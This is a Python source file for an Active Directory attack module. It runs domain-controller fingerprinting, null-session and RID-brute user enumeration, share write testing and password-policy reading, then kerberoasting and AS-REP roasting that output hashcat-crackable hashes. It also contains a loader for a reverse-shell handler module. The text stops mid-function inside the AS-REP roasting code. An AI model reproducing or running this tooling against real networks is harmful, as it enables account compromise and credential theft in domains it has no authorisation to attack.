#!/usr/bin/env python3
"""
adsec — Active Directory security assessment module for SecV
Author: 0xb0rn3 | github.com/0xb0rn3

Single-tool, full-chain Active Directory pentest:
  discover → users → groups → shares → passpol → asreproast →
  kerberoast → spray → vulncheck → bloodhound → loot → secrets

Wraps nmap / netexec / kerbrute / impacket / ldap3 with pure-Python
fallbacks via impacket+ldap3 when external CLIs aren't installed.
"""

import json
import sys
import os
import re
import socket
import shutil
import time
import base64
import subprocess
import threading
from pathlib import Path
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, asdict, field
from typing import Any, Dict, List, Optional, Tuple
import importlib.util as _ilu

# ── OnlyShell reverse shell handler ──────────────────────────────────────────
def _local_ip() -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80)); ip = s.getsockname()[0]; s.close()
        return ip
    except Exception:
        return "0.0.0.0"

_RS_MOD = None
def _rs():
    global _RS_MOD
    if _RS_MOD is not None:
        return _RS_MOD
    for _c in [
        Path(__file__).parent.parent.parent / "network" / "revshell" / "revshell.py",
        Path(__file__).parent / "revshell" / "revshell.py",
    ]:
        if _c.exists():
            _s = _ilu.spec_from_file_location("revshell", _c)
            _m = _ilu.module_from_spec(_s); _s.loader.exec_module(_m)
            _RS_MOD = _m; return _m
    return None

# ============================================================================
# CAPABILITY DETECTION
# ============================================================================

CAPS: Dict[str, Any] = {
    'nmap':              bool(shutil.which('nmap')),
    'smbclient':         bool(shutil.which('smbclient')),
    'rpcclient':         bool(shutil.which('rpcclient')),
    'ldapsearch':        bool(shutil.which('ldapsearch')),
    'nxc':               bool(shutil.which('nxc') or shutil.which('netexec')),
    'crackmapexec':      bool(shutil.which('crackmapexec') or shutil.which('cme')),
    'enum4linux_ng':     bool(shutil.which('enum4linux-ng')),
    'enum4linux':        bool(shutil.which('enum4linux')),
    'kerbrute':          bool(shutil.which('kerbrute')),
    'smbmap':            bool(shutil.which('smbmap')),
    'bloodhound_python': bool(shutil.which('bloodhound-python')),
    'getuserspns':       bool(shutil.which('GetUserSPNs.py') or shutil.which('impacket-GetUserSPNs')),
    'getnpusers':        bool(shutil.which('GetNPUsers.py') or shutil.which('impacket-GetNPUsers')),
    'secretsdump':       bool(shutil.which('secretsdump.py') or shutil.which('impacket-secretsdump')),
    'nslookup':          bool(shutil.which('nslookup')),
    'dig':               bool(shutil.which('dig')),
    'root':              os.geteuid() == 0,
}

try:
    import ldap3
    from ldap3 import Server, Connection, ALL, NTLM, KERBEROS, SUBTREE
    from ldap3.core.exceptions import LDAPBindError
    CAPS['ldap3'] = True
except ImportError:
    CAPS['ldap3'] = False

try:
    import dns.resolver
    import dns.reversename
    CAPS['dnspython'] = True
except ImportError:
    CAPS['dnspython'] = False

try:
    import impacket
    from impacket.smbconnection import SMBConnection, SessionError
    from impacket.dcerpc.v5 import transport, samr
    from impacket.dcerpc.v5.dtypes import NULL
    from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS, sendReceive, KerberosError
    from impacket.krb5.types import Principal, KerberosTime, Ticket
    from impacket.krb5 import constants
    from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, AS_REP, seq_set, seq_set_iter, TGS_REP
    CAPS['impacket'] = True
except ImportError:
    CAPS['impacket'] = False

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    CAPS['requests'] = True
except ImportError:
    CAPS['requests'] = False


# ============================================================================
# DATA STRUCTURES
# ============================================================================

@dataclass
class DomainInfo:
    domain: str = ""
    netbios: str = ""
    domain_sid: str = ""
    forest: str = ""
    dc_hostname: str = ""
    dc_ip: str = ""
    os: str = ""
    smb_signing: str = ""
    smb_dialect: str = ""
    ldap_anonymous: bool = False
    smb_anonymous: bool = False
    null_session: bool = False
    functional_level: str = ""
    naming_contexts: List[str] = field(default_factory=list)
    has_smbv1: bool = False
    is_dc: bool = False


@dataclass
class ADUser:
    sid: str = ""
    rid: int = 0
    username: str = ""
    full_name: str = ""
    description: str = ""
    last_logon: str = ""
    pwd_last_set: str = ""
    kerberos_preauth: bool = True   # False = AS-REP roastable
    spn: List[str] = field(default_factory=list)
    admin_count: bool = False
    enabled: bool = True
    locked: bool = False
    member_of: List[str] = field(default_factory=list)
    user_account_control: int = 0


@dataclass
class ADGroup:
    sid: str = ""
    name: str = ""
    description: str = ""
    members: List[str] = field(default_factory=list)
    type: str = ""


@dataclass
class SMBShare:
    name: str = ""
    type: str = ""
    comment: str = ""
    readable: bool = False
    writable: bool = False
    root_listing: List[str] = field(default_factory=list)


@dataclass
class Vulnerability:
    cve: str = ""
    name: str = ""
    vulnerable: bool = False
    evidence: str = ""
    severity: str = "INFO"   # INFO / LOW / MEDIUM / HIGH / CRITICAL


@dataclass
class SprayResult:
    username: str = ""
    password: str = ""
    success: bool = False
    error: str = ""


@dataclass
class LootItem:
    share: str = ""
    path: str = ""
    type: str = ""
    size: int = 0
    content_preview: str = ""
    severity: str = "INFO"


# ============================================================================
# UTILITIES
# ============================================================================

def log(msg: str) -> None:
    """Log to stderr so module JSON stdout stays clean."""
    print(f"[adsec] {msg}", file=sys.stderr, flush=True)


def parse_hash(h: str) -> Tuple[str, str]:
    """Parse 'LM:NT' or just 'NT' into (LM, NT)."""
    if not h:
        return "", ""
    if ":" in h:
        parts = h.split(":")
        return parts[0], parts[1]
    return "aad3b435b51404eeaad3b435b51404ee", h   # empty LM


def run_cmd(cmd: List[str], timeout: int = 30, input_data: Optional[str] = None) -> Tuple[int, str, str]:
    """Run a command, return (rc, stdout, stderr)."""
    try:
        proc = subprocess.run(
            cmd, capture_output=True, text=True,
            timeout=timeout, input=input_data, errors='replace'
        )
        return proc.returncode, proc.stdout, proc.stderr
    except subprocess.TimeoutExpired:
        return 124, "", f"timeout after {timeout}s"
    except FileNotFoundError:
        return 127, "", f"{cmd[0]} not found"
    except Exception as e:
        return 1, "", str(e)


def tcp_open(host: str, port: int, timeout: float = 2.0) -> bool:
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False


def resolve(host: str) -> str:
    try:
        return socket.gethostbyname(host)
    except socket.gaierror:
        return ""


def reverse_resolve(ip: str) -> str:
    try:
        return socket.gethostbyaddr(ip)[0]
    except (socket.herror, socket.gaierror):
        return ""


def safe_filename(s: str) -> str:
    return re.sub(r'[^A-Za-z0-9._-]', '_', s)


def ts() -> str:
    return datetime.now().strftime("%Y%m%d-%H%M%S")


# ============================================================================
# DISCOVERY
# ============================================================================

class ADDiscovery:
    """Unauthenticated DC fingerprinting and domain identification."""

    def __init__(self, target: str, timeout: int = 10):
        self.target = target
        self.timeout = timeout
        self.info = DomainInfo()
        self.info.dc_ip = resolve(target) or target

    def run(self) -> DomainInfo:
        log(f"discover → fingerprinting {self.target}")
        self._port_probe()
        self._nmap_dc()
        self._smb_probe()
        self._ldap_probe()
        self._netbios_probe()
        return self.info

    def _port_probe(self) -> None:
        """Quick TCP probe for AD-relevant ports."""
        ports = {53: 'dns', 88: 'kerberos', 135: 'rpc', 139: 'netbios-ssn',
                 389: 'ldap', 445: 'smb', 464: 'kpasswd', 636: 'ldaps',
                 593: 'rpc-https', 3268: 'gc', 3269: 'gc-ssl'}
        open_ports = []
        for port, name in ports.items():
            if tcp_open(self.target, port, 1.5):
                open_ports.append(port)
        # If 88 + 389 + 445 → almost certainly a DC
        if 88 in open_ports and 389 in open_ports and 445 in open_ports:
            self.info.is_dc = True

    def _nmap_dc(self) -> None:
        """Fire nmap with smb-os-discovery + ldap-rootdse for fast fingerprint."""
        if not CAPS['nmap']:
            return
        rc, out, _ = run_cmd([
            'nmap', '-Pn', '-T4', '-p', '88,135,139,389,445,636,3268',
            '--script', 'smb-os-discovery,ldap-rootdse,smb2-security-mode',
            '-oX', '-', self.target
        ], timeout=self.timeout * 6)
        if rc != 0:
            return
        # Parse smb-os-discovery
        m = re.search(r'OS:\s*(.+?)(?:\n|\\|$)', out)
        if m:
            self.info.os = m.group(1).strip()
        m = re.search(r'NetBIOS computer name:\s*(.+?)(?:\\x00|\n|$)', out)
        if m:
            self.info.dc_hostname = m.group(1).strip()
        m = re.search(r'Domain name:\s*(.+?)(?:\\x00|\n|$)', out)
        if m and not self.info.domain:
            self.info.domain = m.group(1).strip()
        m = re.search(r'Forest name:\s*(.+?)(?:\\x00|\n|$)', out)
        if m:
            self.info.forest = m.group(1).strip()
        m = re.search(r'NetBIOS domain name:\s*(.+?)(?:\\x00|\n|$)', out)
        if m:
            self.info.netbios = m.group(1).strip()
        # SMB signing
        if 'message_signing: required' in out:
            self.info.smb_signing = 'required'
        elif 'message_signing: supported' in out:
            self.info.smb_signing = 'supported'
        elif 'message_signing: disabled' in out:
            self.info.smb_signing = 'disabled'
        # LDAP rootDSE — naming contexts
        for nc in re.findall(r'namingContexts:\s*(\S+)', out):
            self.info.naming_contexts.append(nc)
        if any('DC=' in nc for nc in self.info.naming_contexts) and not self.info.domain:
            for nc in self.info.naming_contexts:
                if nc.upper().startswith('DC='):
                    self.info.domain = '.'.join(p[3:] for p in nc.split(','))
                    break

    def _smb_probe(self) -> None:
        """Use impacket SMBConnection for null session + signing detection."""
        if not CAPS['impacket']:
            return
        try:
            smb = SMBConnection(self.target, self.target, sess_port=445, timeout=self.timeout)
            # Try null session
            try:
                smb.login('', '')
                self.info.smb_anonymous = True
                self.info.null_session = True
                self.info.dc_hostname = smb.getServerName() or self.info.dc_hostname
                self.info.netbios = smb.getServerDomain() or self.info.netbios
                if not self.info.os:
                    self.info.os = f"{smb.getServerOS()}"
                self.info.smb_dialect = f"SMB{smb.getDialect():x}" if hasattr(smb, 'getDialect') else ""
                if not self.info.smb_signing:
                    self.info.smb_signing = 'required' if smb.isSigningRequired() else 'optional'
                smb.logoff()
            except SessionError:
                pass
            except Exception:
                pass
        except Exception as e:
            log(f"smb probe error: {e}")

    def _ldap_probe(self) -> None:
        """Anonymous LDAP rootDSE."""
        if not CAPS['ldap3']:
            return
        try:
            server = Server(self.target, get_info=ALL, connect_timeout=self.timeout)
            conn = Connection(server, auto_bind=True, receive_timeout=self.timeout)
            self.info.ldap_anonymous = True
            if server.info:
                if not self.info.naming_contexts and server.info.naming_contexts:
                    self.info.naming_contexts = list(server.info.naming_contexts)
                # Functional level
                attrs = server.info.other or {}
                fl = attrs.get('domainFunctionality', [''])[0]
                if fl:
                    fl_map = {'0': '2000', '1': '2003-Interim', '2': '2003',
                              '3': '2008', '4': '2008R2', '5': '2012',
                              '6': '2012R2', '7': '2016', '8': '2025'}
                    self.info.functional_level = fl_map.get(str(fl), str(fl))
                if not self.info.dc_hostname:
                    dn = attrs.get('dnsHostName', [''])[0]
                    if dn:
                        self.info.dc_hostname = dn
                if not self.info.domain:
                    for nc in self.info.naming_contexts:
                        if nc.upper().startswith('DC='):
                            self.info.domain = '.'.join(p[3:] for p in nc.split(','))
                            break
            conn.unbind()
        except LDAPBindError:
            self.info.ldap_anonymous = False
        except Exception as e:
            log(f"ldap probe error: {e}")

    def _netbios_probe(self) -> None:
        """nmblookup -A as a last resort for hostname/domain."""
        if self.info.dc_hostname and self.info.netbios:
            return
        if shutil.which('nmblookup'):
            rc, out, _ = run_cmd(['nmblookup', '-A', self.target], timeout=5)
            if rc == 0:
                m = re.search(r'(\S+)\s+<00>\s+-\s+M\s', out)
                if m and not self.info.dc_hostname:
                    self.info.dc_hostname = m.group(1).strip()
                m = re.search(r'(\S+)\s+<00>\s+-\s+\<GROUP\>', out)
                if m and not self.info.netbios:
                    self.info.netbios = m.group(1).strip()


# ============================================================================
# AUTHENTICATION HELPER
# ============================================================================

class ADAuth:
    """Holds credentials and produces auth context for SMB/LDAP/Kerberos."""

    def __init__(self, params: Dict[str, Any]):
        self.domain = (params.get('domain') or "").strip()
        self.username = (params.get('username') or "").strip()
        self.password = params.get('password') or ""
        self.hash = (params.get('hash') or "").strip()
        self.kerberos = bool(params.get('kerberos'))
        self.dc_ip = (params.get('dc_ip') or "").strip()
        self.lm, self.nt = parse_hash(self.hash)

    @property
    def has_creds(self) -> bool:
        return bool(self.username) and (bool(self.password) or bool(self.hash))

    def smb_login(self, conn: 'SMBConnection') -> None:
        if self.hash:
            conn.login(self.username, '', self.domain, self.lm, self.nt)
        else:
            conn.login(self.username, self.password, self.domain)

    def ldap_user(self) -> str:
        if not self.username:
            return ""
        if '\\' in self.username or '@' in self.username:
            return self.username
        if self.domain:
            return f"{self.domain}\\{self.username}"
        return self.username


# ============================================================================
# ENUMERATION
# ============================================================================

class ADEnumerator:
    """User/group/share/passpol enumeration via LDAP, SAMR, SMB."""

    def __init__(self, target: str, auth: ADAuth, timeout: int = 30):
        self.target = target
        self.auth = auth
        self.timeout = timeout

    # ---- LDAP user enum ----
    def users_via_ldap(self) -> List[ADUser]:
        if not CAPS['ldap3']:
            log("ldap3 missing — skipping LDAP user enum")
            return []
        users: List[ADUser] = []
        try:
            server = Server(self.target, get_info=ALL, connect_timeout=self.timeout)
            user = self.auth.ldap_user()
            authentication = NTLM if (self.auth.has_creds and not self.auth.kerberos) else None
            password = self.auth.password or (f"{self.auth.lm}:{self.auth.nt}" if self.auth.hash else "")
            if authentication:
                conn = Connection(server, user=user, password=password,
                                  authentication=authentication, auto_bind=True,
                                  receive_timeout=self.timeout)
            else:
                conn = Connection(server, auto_bind=True, receive_timeout=self.timeout)
            # Find base DN
            base = ""
            for nc in (server.info.naming_contexts if server.info else []):
                if nc.upper().startswith("DC="):
                    base = nc
                    break
            if not base:
                conn.unbind()
                return []
            attrs = ['sAMAccountName', 'objectSid', 'displayName', 'description',
                     'userAccountControl', 'lastLogon', 'pwdLastSet',
                     'servicePrincipalName', 'adminCount', 'memberOf']
            conn.search(base, '(&(objectClass=user)(objectCategory=person))',
                        search_scope=SUBTREE, attributes=attrs, paged_size=500)
            for entry in conn.entries:
                u = ADUser()
                u.username = str(entry.sAMAccountName) if 'sAMAccountName' in entry else ''
                u.full_name = str(entry.displayName) if 'displayName' in entry else ''
                u.description = str(entry.description) if 'description' in entry else ''
                if 'objectSid' in entry:
                    sid_val = entry.objectSid.value
                    u.sid = str(sid_val) if sid_val else ''
                    if u.sid:
                        try:
                            u.rid = int(u.sid.split('-')[-1])
                        except ValueError:
                            pass
                if 'userAccountControl' in entry:
                    try:
                        uac = int(entry.userAccountControl.value)
                        u.user_account_control = uac
                        u.enabled = not bool(uac & 0x2)
                        u.locked = bool(uac & 0x10)
                        # 0x400000 = DONT_REQUIRE_PREAUTH
                        u.kerberos_preauth = not bool(uac & 0x400000)
                    except (ValueError, TypeError):
                        pass
                if 'servicePrincipalName' in entry:
                    spns = entry.servicePrincipalName.value
                    u.spn = list(spns) if isinstance(spns, list) else ([spns] if spns else [])
                if 'adminCount' in entry:
                    try:
                        u.admin_count = int(entry.adminCount.value or 0) > 0
                    except (ValueError, TypeError):
                        pass
                if 'memberOf' in entry:
                    mo = entry.memberOf.value
                    u.member_of = list(mo) if isinstance(mo, list) else ([mo] if mo else [])
                if 'lastLogon' in entry:
                    u.last_logon = str(entry.lastLogon.value or '')
                if 'pwdLastSet' in entry:
                    u.pwd_last_set = str(entry.pwdLastSet.value or '')
                if u.username:
                    users.append(u)
            conn.unbind()
        except Exception as e:
            log(f"ldap users error: {e}")
        return users

    # ---- SAMR RID brute (works with null session if allowed) ----
    def users_via_samr(self, rid_max: int = 4000) -> List[ADUser]:
        if not CAPS['impacket']:
            return []
        users: List[ADUser] = []
        try:
            rpctransport = transport.SMBTransport(
                self.target, 445, r'\samr',
                self.auth.username, self.auth.password,
                self.auth.domain, self.auth.lm, self.auth.nt
            )
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(samr.MSRPC_UUID_SAMR)
            resp = samr.hSamrConnect(dce)
            server_handle = resp['ServerHandle']
            resp = samr.hSamrEnumerateDomainsInSamServer(dce, server_handle)
            domains = resp['Buffer']['Buffer']
            domain_name = domains[0]['Name'] if domains else ''
            resp = samr.hSamrLookupDomainInSamServer(dce, server_handle, domain_name)
            domain_sid = resp['DomainId'].formatCanonical()
            resp = samr.hSamrOpenDomain(dce, server_handle, domainId=resp['DomainId'])
            domain_handle = resp['DomainHandle']
            # Try EnumerateUsersInDomain first (full enumeration)
            try:
                enum_ctx = 0
                while True:
                    resp = samr.hSamrEnumerateUsersInDomain(dce, domain_handle, enumerationContext=enum_ctx)
                    for u_entry in resp['Buffer']['Buffer']:
                        u = ADUser()
                        u.username = str(u_entry['Name'])
                        u.rid = int(u_entry['RelativeId'])
                        u.sid = f"{domain_sid}-{u.rid}"
                        users.append(u)
                    if resp['ErrorCode'] != 0x105:   # STATUS_MORE_ENTRIES
                        break
                    enum_ctx = resp['EnumerationContext']
            except Exception:
                # Fall back to RID brute via LookupRids (anonymous null sessions sometimes allow this)
                rids = list(range(500, rid_max + 1))
                for batch_start in range(0, len(rids), 500):
                    batch = rids[batch_start:batch_start + 500]
                    try:
                        resp = samr.hSamrLookupIdsInDomain(dce, domain_handle, batch)
                        for i, name in enumerate(resp['Names']['Element']):
                            if name['Length'] > 0:
                                u = ADUser()
                                u.username = str(name)
                                u.rid = batch[i]
                                u.sid = f"{domain_sid}-{u.rid}"
                                users.append(u)
                    except Exception:
                        continue
            dce.disconnect()
        except Exception as e:
            log(f"samr enum error: {e}")
        return users

    # ---- LDAP groups ----
    def groups_via_ldap(self) -> List[ADGroup]:
        if not CAPS['ldap3']:
            return []
        groups: List[ADGroup] = []
        try:
            server = Server(self.target, get_info=ALL, connect_timeout=self.timeout)
            user = self.auth.ldap_user()
            authentication = NTLM if (self.auth.has_creds and not self.auth.kerberos) else None
            password = self.auth.password or (f"{self.auth.lm}:{self.auth.nt}" if self.auth.hash else "")
            if authentication:
                conn = Connection(server, user=user, password=password,
                                  authentication=authentication, auto_bind=True,
                                  receive_timeout=self.timeout)
            else:
                conn = Connection(server, auto_bind=True, receive_timeout=self.timeout)
            base = next((nc for nc in (server.info.naming_contexts if server.info else [])
                         if nc.upper().startswith("DC=")), "")
            if not base:
                conn.unbind()
                return []
            conn.search(base, '(objectClass=group)', search_scope=SUBTREE,
                        attributes=['sAMAccountName', 'objectSid', 'description', 'member', 'groupType'],
                        paged_size=500)
            for entry in conn.entries:
                g = ADGroup()
                g.name = str(entry.sAMAccountName) if 'sAMAccountName' in entry else ''
                g.description = str(entry.description) if 'description' in entry else ''
                if 'objectSid' in entry:
                    g.sid = str(entry.objectSid.value or '')
                if 'member' in entry:
                    m = entry.member.value
                    g.members = list(m) if isinstance(m, list) else ([m] if m else [])
                if 'groupType' in entry:
                    try:
                        gt = int(entry.groupType.value)
                        g.type = 'Security' if gt & 0x80000000 else 'Distribution'
                    except (ValueError, TypeError):
                        pass
                if g.name:
                    groups.append(g)
            conn.unbind()
        except Exception as e:
            log(f"ldap groups error: {e}")
        return groups

    # ---- SMB shares ----
    def shares(self) -> List[SMBShare]:
        if not CAPS['impacket']:
            return self._shares_via_smbclient()
        out: List[SMBShare] = []
        try:
            smb = SMBConnection(self.target, self.target, sess_port=445, timeout=self.timeout)
            self.auth.smb_login(smb)
            for s in smb.listShares():
                share = SMBShare()
                share.name = s['shi1_netname'][:-1]   # strip trailing null
                share.comment = s['shi1_remark'][:-1] if s['shi1_remark'] else ''
                stype = s['shi1_type']
                share.type = 'DISK' if (stype & 0x7FFFFFFF) == 0 else (
                    'PRINTER' if (stype & 0x7FFFFFFF) == 1 else (
                        'IPC' if (stype & 0x7FFFFFFF) == 3 else f"TYPE-{stype}"))
                # READ test
                try:
                    files = list(smb.listPath(share.name, '*'))
                    share.readable = True
                    share.root_listing = [f.get_longname() for f in files
                                          if f.get_longname() not in ('.', '..')][:30]
                except Exception:
                    share.readable = False
                # WRITE test (try create + delete a tiny file)
                if share.readable and share.type == 'DISK' and share.name not in ('IPC$',):
                    try:
                        test = f"adsec_{ts()}.tmp"
                        fid = smb.createFile(share.name, test)
                        smb.closeFile(share.name, fid)
                        smb.deleteFile(share.name, test)
                        share.writable = True
                    except Exception:
                        share.writable = False
                out.append(share)
            smb.logoff()
        except Exception as e:
            log(f"shares error: {e}")
        return out

    def _shares_via_smbclient(self) -> List[SMBShare]:
        if not CAPS['smbclient']:
            return []
        shares: List[SMBShare] = []
        cmd = ['smbclient', '-L', f'//{self.target}', '-N']
        if self.auth.has_creds:
            cmd = ['smbclient', '-L', f'//{self.target}',
                   '-U', f'{self.auth.domain}/{self.auth.username}%{self.auth.password}']
        rc, out, _ = run_cmd(cmd, timeout=self.timeout)
        if rc != 0:
            return []
        for line in out.splitlines():
            m = re.match(r'\s+(\S+)\s+(\w+)\s*(.*)', line)
            if m and m.group(2) in ('Disk', 'IPC', 'Printer'):
                shares.append(SMBShare(name=m.group(1), type=m.group(2).upper(),
                                       comment=m.group(3).strip()))
        return shares

    # ---- Password policy ----
    def passpol(self) -> Dict[str, Any]:
        pol: Dict[str, Any] = {}
        if not CAPS['impacket']:
            return self._passpol_via_rpcclient()
        try:
            rpctransport = transport.SMBTransport(
                self.target, 445, r'\samr',
                self.auth.username, self.auth.password,
                self.auth.domain, self.auth.lm, self.auth.nt
            )
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(samr.MSRPC_UUID_SAMR)
            resp = samr.hSamrConnect(dce)
            server_handle = resp['ServerHandle']
            resp = samr.hSamrEnumerateDomainsInSamServer(dce, server_handle)
            domain_name = resp['Buffer']['Buffer'][0]['Name']
            resp = samr.hSamrLookupDomainInSamServer(dce, server_handle, domain_name)
            resp = samr.hSamrOpenDomain(dce, server_handle, domainId=resp['DomainId'])
            domain_handle = resp['DomainHandle']
            try:
                resp = samr.hSamrQueryInformationDomain2(
                    dce, domain_handle,
                    domainInformationClass=samr.DOMAIN_INFORMATION_CLASS.DomainPasswordInformation
                )
                pol['min_length'] = int(resp['Buffer']['Password']['MinPasswordLength'])
                pol['history'] = int(resp['Buffer']['Password']['PasswordHistoryLength'])
                pol['complexity'] = bool(resp['Buffer']['Password']['PasswordProperties'] & 0x1)
                # MaxPasswordAge / MinPasswordAge are filetime negatives
                max_age_lo = int(resp['Buffer']['Password']['MaxPasswordAge']['LowPart'])
                max_age_hi = int(resp['Buffer']['Password']['MaxPasswordAge']['HighPart'])
                max_age = (max_age_hi << 32) | (max_age_lo & 0xFFFFFFFF)
                if max_age & (1 << 63):
                    max_age -= (1 << 64)
                pol['max_age_days'] = abs(max_age) / 10000000 / 86400 if max_age else 0
            except Exception as e:
                log(f"passpol query error: {e}")
            try:
                resp = samr.hSamrQueryInformationDomain2(
                    dce, domain_handle,
                    domainInformationClass=samr.DOMAIN_INFORMATION_CLASS.DomainLockoutInformation
                )
                pol['lockout_threshold'] = int(resp['Buffer']['Lockout']['LockoutThreshold'])
                lockout_dur = int(resp['Buffer']['Lockout']['LockoutDuration'])
                pol['lockout_duration_min'] = abs(lockout_dur) / 10000000 / 60 if lockout_dur else 0
                obs_window = int(resp['Buffer']['Lockout']['LockoutObservationWindow'])
                pol['observation_window_min'] = abs(obs_window) / 10000000 / 60 if obs_window else 0
            except Exception:
                pass
            dce.disconnect()
        except Exception as e:
            log(f"passpol error: {e}")
        return pol

    def _passpol_via_rpcclient(self) -> Dict[str, Any]:
        if not CAPS['rpcclient']:
            return {}
        pol: Dict[str, Any] = {}
        cmd = ['rpcclient', '-U', '%', self.target, '-c', 'getdompwinfo;getdomain_password_information']
        rc, out, _ = run_cmd(cmd, timeout=self.timeout)
        if rc != 0:
            return {}
        m = re.search(r'min_password_length:\s*(\d+)', out)
        if m:
            pol['min_length'] = int(m.group(1))
        m = re.search(r'password_properties:\s*(0x[0-9a-fA-F]+)', out)
        if m:
            pol['complexity'] = bool(int(m.group(1), 16) & 0x1)
        return pol


# ============================================================================
# KERBEROS ATTACKS
# ============================================================================

class KerberosAttacker:
    """Kerberoasting and AS-REP roasting via impacket."""

    def __init__(self, target: str, auth: ADAuth, timeout: int = 30):
        self.target = target
        self.auth = auth
        self.timeout = timeout

    def kerberoast(self) -> List[Dict[str, str]]:
        """Find SPN-bearing users and request TGS for each. Returns hashcat-format hashes."""
        if not CAPS['impacket'] or not CAPS['ldap3']:
            log("kerberoast needs impacket + ldap3")
            return []
        if not self.auth.has_creds:
            log("kerberoast needs credentials")
            return []
        results: List[Dict[str, str]] = []
        # Step 1: find users with SPN via LDAP
        spn_users = []
        try:
            server = Server(self.target, get_info=ALL, connect_timeout=self.timeout)
            conn = Connection(server, user=self.auth.ldap_user(),
                              password=self.auth.password or f"{self.auth.lm}:{self.auth.nt}",
                              authentication=NTLM, auto_bind=True,
                              receive_timeout=self.timeout)
            base = next((nc for nc in (server.info.naming_contexts if server.info else [])
                         if nc.upper().startswith("DC=")), "")
            if not base:
                conn.unbind()
                return []
            conn.search(base,
                        '(&(samAccountType=805306368)(servicePrincipalName=*)'
                        '(!(samAccountName=krbtgt)))',
                        search_scope=SUBTREE,
                        attributes=['sAMAccountName', 'servicePrincipalName'])
            for entry in conn.entries:
                username = str(entry.sAMAccountName)
                spns = entry.servicePrincipalName.value
                spns = list(spns) if isinstance(spns, list) else [spns] if spns else []
                for spn in spns:
                    spn_users.append((username, spn))
            conn.unbind()
        except Exception as e:
            log(f"kerberoast LDAP enum error: {e}")
            return []
        if not spn_users:
            log("no SPN-bearing accounts found")
            return []
        log(f"found {len(spn_users)} SPN entries — requesting TGS")
        # Step 2: getKerberosTGT then getKerberosTGS for each SPN
        try:
            user_principal = Principal(self.auth.username,
                                       type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            tgt, cipher, _, sessionKey = getKerberosTGT(
                user_principal, self.auth.password,
                self.auth.domain.upper(),
                self.auth.lm.encode() if self.auth.hash else b'',
                self.auth.nt.encode() if self.auth.hash else b'',
                aesKey='', kdcHost=self.auth.dc_ip or self.target
            )
            for username, spn in spn_users:
                try:
                    server_principal = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
                    tgs, cipher, _, _ = getKerberosTGS(
                        server_principal, self.auth.domain.upper(),
                        self.auth.dc_ip or self.target, tgt, cipher, sessionKey
                    )
                    # Format as $krb5tgs$23$ hashcat format
                    from impacket.krb5.asn1 import TGS_REP
                    from pyasn1.codec.der import decoder
                    decoded = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
                    enc_part = bytes(decoded['ticket']['enc-part']['cipher'])
                    etype = int(decoded['ticket']['enc-part']['etype'])
                    if etype == 23:   # RC4-HMAC
                        h = (f"$krb5tgs$23$*{username}${self.auth.domain.upper()}${spn}*$"
                             f"{enc_part[:16].hex()}${enc_part[16:].hex()}")
                    elif etype in (17, 18):
                        h = f"$krb5tgs${etype}${username}${self.auth.domain.upper()}${spn}${enc_part.hex()}"
                    else:
                        h = f"$krb5tgs${etype}${username}${self.auth.domain.upper()}${spn}${enc_part.hex()}"
                    results.append({'username': username, 'spn': spn, 'hash': h, 'etype': str(etype)})
                except Exception as e:
                    log(f"TGS for {username} ({spn}) failed: {e}")
        except Exception as e:
            log(f"kerberoast TGT error: {e}")
        return results

    def asreproast(self, userlist: List[str]) -> List[Dict[str, str]]:
        """Probe each user for DONT_REQUIRE_PREAUTH and dump AS-REP hash."""
        if not CAPS['impacket']:
            log("asreproast needs impacket")
            return []
        if not self.auth.domain:
            log("asreproast needs domain")
            return []
        results: List[Dict[str, str]] = []
        from impacket.krb5.kerberosv5 import KerberosError
        from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, AS_REP
        from impacket.krb5 import constants as k_constants
        from impacket.krb5.types import Principal
        from pyasn1.codec.der import encoder, decoder
        from pyasn1.type.univ import noValue

        kdc = self.auth.dc_ip or self.target
        for username in userlist:
            username = username.strip()
            if not username:
                continue
            try:
                client = Principal(username, type=k_constants.PrincipalNameType.NT_PRINCIPAL.value)
                as_req = AS_REQ()
                domain_upper = self.auth.domain.upper()
                as_req['pvno'] = 5
                as_req['msg-type'] = int(k_constants.ApplicationTagNumbers.AS_REQ.value)
                as_req['padata'] = noValue
                as_req['padata'][0] = noValue
                as_req['padata'][0]['padata-type'] = int(k_constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
                pac_request = KERB_PA_PAC_REQUEST()
                pac_request['include-pac'] = True
                as_req['padata'][0]['padata-value'] = encoder.encode(pac_request)
                req_body = noValue
                opts = list()
                opts.append(int(k_constants.KDCOptions.forwardable.value))
                opts.append(int(k_constants.KDCOptions.renewable.value))
                opts.append(int(k_constants.KDCOptions.proxiable.value))
                req_body['kdc-options'] = k_constants.encodeFlags(opts)
                seq_set(req_body, 'sname', Principal(f'krbtgt/{domain_upper}',
                                                     type=k_constants.PrincipalNameType.NT_PRINCIPAL.value).components_to_asn1)
                seq_set(req_body, 'cname', client.components_to_asn1)
                req_body['realm'] = domain_upper
                now = datetime.utcnow()
                req_body['till'] = KerberosTime.to_asn1(now)
                req_body['rtime'] = KerberosTime.to_asn1(now)
                req_body['nonce'] = 0
                seq_set_iter(req_body, 'etype', (
                    int(k_constants.EncryptionTypes.rc4_hmac.value),
                    int(k_constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
                    int(k_constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value)))
                as_req['req-body'] = req_body
                msg = encoder.encode(as_req)
                r = sendReceive(msg, domain_upper, kdc)
                # If we got AS-REP — preauth not required, hash extractable
                as_rep = decoder.decode(r, asn1Spec=AS_REP())[0]
                etype = int(as_rep['enc-part']['etype'])
                cipher = bytes(as_rep['enc-part']['cipher'])
                if etype == 23:
                    h = f"$krb5asrep$23${username}@{domain_upper}:{cipher[:16].hex()}${cipher[16:].hex()}"
                else:
                    h = f"$krb5asrep${etype}${username}@{domain_upper}:{cipher.hex()}"
